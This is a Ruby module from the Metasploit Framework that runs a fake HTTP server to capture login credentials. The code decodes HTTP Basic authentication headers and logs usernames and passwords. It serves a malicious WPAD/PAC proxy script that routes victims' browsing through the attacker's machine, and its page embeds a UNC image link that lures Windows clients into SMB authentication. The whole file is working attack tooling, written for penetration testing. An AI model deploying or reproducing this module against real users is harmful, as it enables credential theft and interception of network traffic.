##
# $Id: socks_unc.rb 5069 2007-08-08 02:46:31Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary

	include Exploit::Remote::TcpServer
	include Auxiliary::Report

	
	def initialize
		super(
			'Name'        => 'Authentication Capture: HTTP',
			'Version'     => '$Revision: 5069 $',
			'Description'    => %q{
				This module provides a fake HTTP service that
			is designed to capture authentication credentials.
			},
			'Author'      => ['ddz', 'hdm'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Capture' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
				OptPath.new('BGIMAGE',    [ false, "The background image to use for the default web page", nil ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		@bgimage = datastore['BGIMAGE']
		@myhost  = datastore['SRVHOST']
		@myport  = datastore['SRVPORT']
		exploit()
	end
	
	def on_client_connect(c)
		@state[c.peerhost] ||= {
			:ip    => c.peerhost, 
			:sites => {}
		}
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end
	
	def on_client_data(cli)
		begin
			case cli.request.parse(cli.get)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)

					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue EOFError
			if (cli.request.completed?)
				dispatch_request(cli, cli.request)

				cli.reset_cli
			end

			close_client(cli)
		end
							
	end

	def close_client(cli)
	end
	
	def dispatch_request(cli, req)
		
		mysrc = Rex::Socket.source_address(cli.peerhost)
		hhead = (req['Host'] || @myhost).split(':', 2)[0]

		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
			basic,auth = req['Authorization'].split(/\s+/)
			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
			report_auth_info(
				:host      => cli.peerhost,
				:proto     => 'http',
				:targ_host => hhead,
				:targ_port => @myport,
				:user      => user,
				:pass      => pass,
				:extra     => req.resource.to_s
			)
			print_status("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
		end
		
		if(req.resource =~ /^wpad.dat|.*\.pac$/i) 
			prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
			res = 
				"HTTP/1.1 200 OK\r\n" +
				"Host: #{hhead}\r\n" +
				"Content-Type: application/x-ns-proxy-autoconfig\r\n" +
				"Content-Length: #{prx.length}\r\n" +
				"Connection: Close\r\n\r\n#{prx}"
			print_status("HTTP wpad.dat sent to #{cli.peerhost}")
			cli.put(res)
			return
		end
		
		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource}")
		
		
		# The google maps / stocks view on the iPhone
		if (req['Host'] == 'iphone-wu.apple.com')
			case req.resource
			when '/glm/mmap'
				print_status("HTTP #{cli.peerhost} is using Google Maps on the iPhone")
			when '/dgw'
				print_status("HTTP #{cli.peerhost} is using Stocks/Weather on the iPhone")
			else
				print_status("HTTP #{cli.peerhost} is request #{req.resource} via the iPhone")
			end
		end
		
		# The itunes store on the iPhone
		if(req['Host'] == 'phobos.apple.com') 
			print_status("HTTP #{cli.peerhost} is using iTunes Store on the iPhone")
			# GET /bag.xml
		end
		
		
		
		# SMB MITM / RELAY
		
		body_extra = ""
		if(@bgimage)
			img_ext = @bgimage.split(".")[-1].downcase
			req_ext = req.resource.split(".")[-1]
			ctypes  =
			{
				"jpg"   => "image/jpeg",
				"jpeg"  => "image/jpeg",
				"png"   => "image/png",
				"gif"   => "image/gif",
			}
			
			begin
				if (img_ext == req_ext.downcase)

					ctype = ctypes[img_ext] || ctypes["jpg"]
					idata = ""
					isize = File.size(@bgimage)
					
					fd = File.open(@bgimage)
					idata = fd.sysread(isize)
					fd.close

					res = 
						"HTTP/1.1 200 OK\r\n" +
						"Host: #{mysrc}\r\n" +
						"Content-Type: #{ctype}\r\n" +
						"Content-Length: #{idata.length}\r\n" +
						"Connection: Close\r\n\r\n#{idata}"			

					cli.put(res)
					return
				end
			rescue ::Exception
			end
		
			body_extra = "<img src='/background.#{img_ext}' width='100%' height='100%'>"
		end
		
		
		
		data = "<html><head><title>Connecting...</title></head><body>#{body_extra}<img src='\\\\#{mysrc}\\public\\loading.jpg' width='1' height='1'></body></html>"
		res  = 
			"HTTP/1.1 200 OK\r\n" +
			"Host: #{mysrc}\r\n" +
			"Content-Type: text/html\r\n" +
			"Content-Length: #{data.length}\r\n" +
			"Connection: Close\r\n\r\n#{data}"

		cli.put(res)
		return		
	
	end



end
end
